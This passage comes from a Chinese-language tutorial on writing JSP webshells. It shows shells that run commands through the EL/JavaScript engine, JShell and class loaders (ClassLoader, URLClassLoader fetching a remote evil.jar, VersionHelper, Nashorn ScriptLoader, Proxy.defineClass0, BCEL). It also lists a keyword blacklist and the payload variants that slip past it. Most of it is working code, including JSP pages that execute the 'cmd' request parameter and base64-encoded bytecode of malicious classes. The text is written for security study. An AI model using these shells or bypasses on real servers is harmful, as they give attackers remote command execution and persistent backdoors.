    for (String tmp:cmd.split(" ")) {
        stringBuilder.append("'").append(tmp).append("'").append(",");
    }
    String f = stringBuilder.substring(0, stringBuilder.length() - 1);
    ELProcessor processor = new ELProcessor();
    Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")");
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder2 = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder2.append(line).append("\n");
    }
    if (stringBuilder2.length() > 0) {
        response.getOutputStream().write(stringBuilder2.toString().getBytes());
    }
%>
</body>
</html>
```

JShell
------

JDK9以上的特性

```java
<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("cmd"))%>
```

绕过
--

常见黑名单如下：

```java
private static final Set<String> blacklist = Sets.newHashSet(
            // Java 全限定类名
            "java.io.File", "java.io.RandomAccessFile", "java.io.FileInputStream", "java.io.FileOutputStream",
            "java.lang.Class", "java.lang.ClassLoader", "java.lang.Runtime", "java.lang.System", "System.getProperty",
            "java.lang.Thread", "java.lang.ThreadGroup", "java.lang.reflect.AccessibleObject", "java.net.InetAddress",
            "java.net.DatagramSocket", "java.net.DatagramSocket", "java.net.Socket", "java.net.ServerSocket",
            "java.net.MulticastSocket", "java.net.MulticastSocket", "java.net.URL", "java.net.HttpURLConnection",
            "java.security.AccessControlContext",
            // JavaScript 方法
            "eval", "new function");
```

我们可以转换形式：

```java
String script="var x=new java.lang.ProcessBuilder; x.command(\"calc\"); x.start();";
String script="new java.lang.ProcessBuilder().command(\"calc\").start();";
```

利用注释或空格等绕过方式

```java
String script="java.lang./****/Runtime.getRuntime().exec(\"calc\")";
```

可以利用 new Function 来创建对象进行绕过

```java
String script="var x=new Function('return'+'(new java.'+'lang.ProcessBuilder)')();  x.command(\"calc\"); x.start();";
```

创建 ScriptEngineManager

```java
new javax.script.ScriptEngineManager().getEngineByName("js").eval("var a = test(); function test() { var x=java.lang."+"Runtime.getRuntime().exec(\"calc\");};");
```

另外，作为解析引擎，它有自己的词法分析机制，具体可以看 `jdk.nashorn.internal.parser.Lexer` 中的源码

```java
String script="var x=java.\u2028lang.Runtime.getRuntime().exec(\"calc\");";
String script="var x=java.\u2029lang.Runtime.getRuntime().exec(\"calc\");";
String script="var x=java.lang.//\nRuntime.getRuntime().exec(\"calc\");";
```

0x05 类加载
========

在学习 Java 安全漫谈的时候我们有接触过 Java 中动态加载字节码的过程里的一些方法。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-36b3f850ff38b738e968f3bff5734ded5875bb8b.png)

这里我们可以提炼出来这么几种实现类加载 shell 的方式，实际上，归根到底，这里所有的方法我们最后都可以回到 ClassLoader 这个抽象类中，这是类加载功能的根本。

ClassLoader
-----------

ClassLoader 本身是一个抽象类，我们在实现类加载的时候会利用到其中的三个方法：loadClass、findClass、defineClass

- oadClass：根据binary name加载Class，如果目标类没被加载过调用父类加载器
- findClass：根据binary name查找Class位置，获取字节码数组
- defineClass：将字节码加载到JVM，转换为Class对象（ 也就是 可以将 `byte[]` 直接转换为 `Class` ），这里也就是我们下面动态加载字节码的关键。defineClass 获得的对象需要进行 resolve 才算完成实例化，或者用newInstance 创建。

但是由于 defineClass 是 protected ，我们要调用的话只能够通过一些其他的方式

### Evil.class

我们在例子中所用到的 base64 是这个类的字节码文件的 base64 编码：

```java
public class Evil {
    static {
        try {
            System.out.println("sp4c1ous forgot his life");
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {}
    }
}

```

注意这里的类中就这些内容，不要包含包路径等，否则后续的利用中也要进行更改。

### POC 1

在 POC1 中，我们利用 继承自 ClassLoader 的类来调用 defineClass ，原版冰蝎中使用的也是这种方法。

```java
package org.test;

import sun.misc.BASE64Decoder;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;

public class Test {
    public static void main(String[] args) throws IOException, IllegalAccessException, InstantiationException {
        // 恶意类的base64编码
        String cmdb64="yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxFdmlsOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAIQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAsADAcAJAwAJQAmAQAYc3A0YzFvdXMgZm9yZ290IGhpcyBsaWZlBwAnDAAoACkHACoMACsALAEABGNhbGMMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAJAAoAAAAAAAIAAQALAAwAAQANAAAALwABAAEAAAAFKrcAAbEAAAACAA4AAAAGAAEAAAABAA8AAAAMAAEAAAAFABAAEQAAAAgAEgAMAAEADQAAAFcAAgABAAAAFrIAAhIDtgAEuAAFEga2AAdXpwAES7EAAQAAABEAFAAIAAMADgAAABIABAAAAAQACAAFABEABgAVAAcADwAAAAIAAAATAAAABwACVAcAFAAAAQAVAAAAAgAW";
        BASE64Decoder decoder=new sun.misc.BASE64Decoder();
        new MyClassLoader(Test.class.getClassLoader()).evil(decoder.decodeBuffer(cmdb64)).newInstance();
    }

    public static class MyClassLoader extends ClassLoader{
        MyClassLoader(ClassLoader c){
            super(c);
        }

        public Class evil(byte []bytes){
            return super.defineClass(bytes,0,bytes.length);
        }
    }
}

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-713a62cc5bf09e85f69931637fc0e7103ae01266.png)

冰蝎中的 shell.jsp

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ea5171244286fbdc1fd25148c313949f44ef3d92.png)

### POC 2

我们也可以对 ClassLoader 中的方法进行重写

```java
package org.test;

import sun.misc.BASE64Decoder;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;

public class Test {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException {
        new ClassLoader(){
            @Override
            public Class<?> loadClass(String name) throws ClassNotFoundException {
                if (name.contains("Evil")){
                    return findClass(name);
                }
                return super.loadClass(name);
            }

            @Override
            protected Class<?> findClass(String name) throws ClassNotFoundException {
                try{
                    String cmdb64="yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxFdmlsOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAIQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAsADAcAJAwAJQAmAQAYc3A0YzFvdXMgZm9yZ290IGhpcyBsaWZlBwAnDAAoACkHACoMACsALAEABGNhbGMMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAJAAoAAAAAAAIAAQALAAwAAQANAAAALwABAAEAAAAFKrcAAbEAAAACAA4AAAAGAAEAAAABAA8AAAAMAAEAAAAFABAAEQAAAAgAEgAMAAEADQAAAFcAAgABAAAAFrIAAhIDtgAEuAAFEga2AAdXpwAES7EAAQAAABEAFAAIAAMADgAAABIABAAAAAQACAAFABEABgAVAAcADwAAAAIAAAATAAAABwACVAcAFAAAAQAVAAAAAgAW";
                    BASE64Decoder decoder=new sun.misc.BASE64Decoder();
                    byte[] bytes=decoder.decodeBuffer(cmdb64);
                    PermissionCollection permissionCollection=new Permissions();
                    permissionCollection.add(new AllPermission());
                    ProtectionDomain protectionDomain=new ProtectionDomain(new CodeSource(null, (Certificate[])null),permissionCollection,this,null);
                    return this.defineClass(name,bytes,0,bytes.length,protectionDomain);
                }catch (Exception e){e.printStackTrace();}
                return super.findClass(name);
            }
        }.loadClass("Evil").newInstance();
    }
}

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f74e52b0c871e8140a6f94d1b26d0c5442820b75.png)

URLClassLoader
--------------

这里在原本 P牛的文章中已经介绍的很详细了，可以移步[我的笔记](http://www.whrizyl819.xyz/2022/03/21/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/#URLClassLoader-%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bclass%E6%96%87%E4%BB%B6)。

shell形式如下：

```java
<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<html>
<body>
<h2>URLClassLoader加载远程jar的JSP WebShell</h2>
<%
    response.getOutputStream().write(new URLClassLoader(new URL[]{new URL("存有恶意jar文件的网址/evil.jar")}).loadClass(
            "EvilBB01").getConstructor(String.class).newInstance(String.valueOf(request.getParameter("cmd"))).toString().getBytes());
%>
</body>
</html>
```

三梦师傅利用 VersionHelper 包装后：

```java
<%@ page import="com.sun.naming.internal.VersionHelper" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<html>
<body>
<h2>VersionHelper包装的URLClassLoader类加载器的JSP WebShell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    String jarPath = tmp + File.separator + "Evil16.class";
    Files.write(Paths.get(jarPath), Base64.getDecoder().decode("yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMRXZpbDE2OwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQALRXZpbDE2LmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAGRXZpbDE2BwBwDABxAHIBAAxFdmlsMTYuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAACwAEAAwADAANACUADwAvABAAPgASAEYAEwAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAFwAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAGwALABwAEgAdABgAHgAgAB8AJwAgACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ"));
    response.getOutputStream().write(
            VersionHelper.getVersionHelper().loadClass("Evil16", "file:" + tmp + File.separator).getConstructor(String.class).newInstance(request.getParameter("cmd")).toString().getBytes());
%>
</body>
</html>
```

ScriptLoader
------------

在 nashorn 下的 ScriptLoader 类中我们可以看到一系列的类加载的操作

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4713b0f2c6ef8cc52f14c75ac2e1b113ce5c76ae.png)

有一系列的继承，实际上最后还是来到了 ClassLoader

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d939133d18aff5b5f3da6b38d7843c4e41803f95.png)

这里的 installClass 可以用于加载字节码文件，不过由于这里的权限关系我们还是需要用反射来进行获取到

```java
public class ScriptLoadTest {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        // 获取ScriptLoader对象
        Class cls=Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
        Constructor constructor=cls.getDeclaredConstructor(Context.class);
        constructor.setAccessible(true);
        Object o=constructor.newInstance(new jdk.nashorn.internal.runtime.Context(new Options(""),null,null));
        // 执行installClass方法
        Method m1=cls.getDeclaredMethod("installClass", String.class, byte[].class, CodeSource.class);
        m1.setAccessible(true);
        String cmdb64="yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxFdmlsOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAIQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAsADAcAJAwAJQAmAQAIRXZpbCBydW4HACcMACgAKQcAKgwAKwAsAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAtAC4BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAERXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAAAQAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABXAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAASAAQAAAAEAAgABQARAAYAFQAHAA8AAAACAAAAEwAAAAcAAlQHABQAAAEAFQAAAAIAFg==";
        BASE64Decoder decoder=new sun.misc.BASE64Decoder();
        Class E=(Class)m1.invoke(o,"Evil",decoder.decodeBuffer(cmdb64),new CodeSource(null,(Certificate[]) null));
        E.newInstance();
    }
}
```

Proxy
-----

Proxy 是我们实现动态代理所利用的类，我们联想一下从静态代理到动态代理，我们动态代理的特点就在于我们可以自动地生成代理类，本质也就是在运行期动态创建某个 interface 的实例。

但是如果 interface 不是 public 属性的话，那么代理类必须由接口的定义加载器定义，这里就会涉及到我们类加载机制了，对源码进行查看可以发现：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2c1fb195c9dbd1c95ffade64d7571248efd828d0.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4b2f050ffa222fd80cafbc29f2b2e4e2bdd87fe4.png)

这里会通过 defineClass0 来实现，那么我们就可以对它进行利用了，因为这里是一个私有的方法，我们需要通过反射的反射的方式来实现：

```java
public class ProxyDefineTest {
    public static void main(String[] args) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException {
        ClassLoader classLoader=ClassLoader.getSystemClassLoader();
        Method m1= Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
        m1.setAccessible(true);
        String cmdb64="yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxFdmlsOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAIQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAsADAcAJAwAJQAmAQAYc3A0YzFvdXMgZm9yZ290IGhpcyBsaWZlBwAnDAAoACkHACoMACsALAEABGNhbGMMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAJAAoAAAAAAAIAAQALAAwAAQANAAAALwABAAEAAAAFKrcAAbEAAAACAA4AAAAGAAEAAAABAA8AAAAMAAEAAAAFABAAEQAAAAgAEgAMAAEADQAAAFcAAgABAAAAFrIAAhIDtgAEuAAFEga2AAdXpwAES7EAAQAAABEAFAAIAAMADgAAABIABAAAAAQACAAFABEABgAVAAcADwAAAAIAAAATAAAABwACVAcAFAAAAQAVAAAAAgAW";
        BASE64Decoder decoder=new sun.misc.BASE64Decoder();
        byte[] classBytes=decoder.decodeBuffer(cmdb64);
        String className="Evil";
        Class E=(Class) m1.invoke(null,classLoader,className,classBytes,0,classBytes.length);
        E.newInstance();
    }
}
```

不过在我所使用的 11 版本下的 Proxy 类下并没有这个 defineClass0

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-05a36782527caa9c53a926e0f2f3b896b83093fd.png)

JDK 1.8 倒是有

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-88b3f391705212b7aa027d9eed889373788327b7.png)

成功执行了

shell 形式：

```java
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Proxy" %>
<%@ page import="java.util.Base64" %>
<%!
    public static Class<?> defineByProxy(String className, byte[] classBytes) throws Exception {

        // 获取系统的类加载器，可以根据具体情况换成一个存在的类加载器
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();

        // 反射java.lang.reflect.Proxy类获取其中的defineClass0方法
        Method method = Proxy.class.getDeclaredMethod("defineClass0",
                ClassLoader.class, String.class, byte[].class, int.class, int.class);
        // 修改方法的访问权限
        method.setAccessible(true);

        // 反射调用java.lang.reflect.Proxy.defineClass0()方法，动态向JVM注册对象
        // 返回一个 Class 对象
        return (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
    }
%>
<%
    byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MQnl0ZUNvZGVFdmlsOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAMQnl0ZUNvZGVFdmlsBwBwDABxAHIBABJCeXRlQ29kZUV2aWwuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAACwAEAAwADAANACUADwAvABAAPgASAEYAEwAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAFwAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAGwALABwAEgAdABgAHgAgAB8AJwAgACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ");
    Class<?> testClass = defineByProxy("ByteCodeEvil", bytes);
    Object result = testClass.getConstructor(String.class).newInstance(request.getParameter("cmd"));
    out.println(result.toString());
%>
```

BCEL
----

不多介绍了，移步 [P牛文章](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html) 即可，这里直接构造一下 shell

```java
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<html>
<body>
<h2>BCEL字节码的JSP WebShell</h2>
<%
